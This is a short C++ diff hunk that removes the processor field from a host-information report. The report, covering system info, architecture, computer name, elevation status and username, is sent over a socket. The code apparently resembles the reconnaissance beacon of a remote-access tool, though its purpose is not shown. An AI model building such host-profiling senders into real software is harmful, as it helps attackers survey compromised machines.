@@ -251,7 +251,7 @@ int main(int argc, char* argv[])
                 std::string username = "User: " + std::string(username_buff);
 
                 std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
-                                    processor + "\n" + elevated + "\n" + username + "\n";
+                                    elevated + "\n" + username + "\n";
                             
                 send(s, output.c_str(), output.size(), 0);
             }
